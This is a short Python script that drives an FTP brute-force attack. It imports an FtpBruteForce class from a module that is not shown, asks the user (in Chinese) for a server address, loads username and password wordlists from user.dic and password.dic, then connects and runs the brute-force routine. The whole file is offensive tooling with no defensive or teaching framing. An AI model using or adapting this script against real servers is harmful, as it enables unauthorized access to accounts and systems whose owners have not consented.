from ftp_brute_force import FtpBruteForce

if __name__ == '__main__':
    server_address = input("请输入服务器地址：")
    user_dict = r"user.dic"
    password_dict = r"password.dic"
    fbf = FtpBruteForce(server_address, user_dict, password_dict)
    fbf.connection()
    fbf.brute()
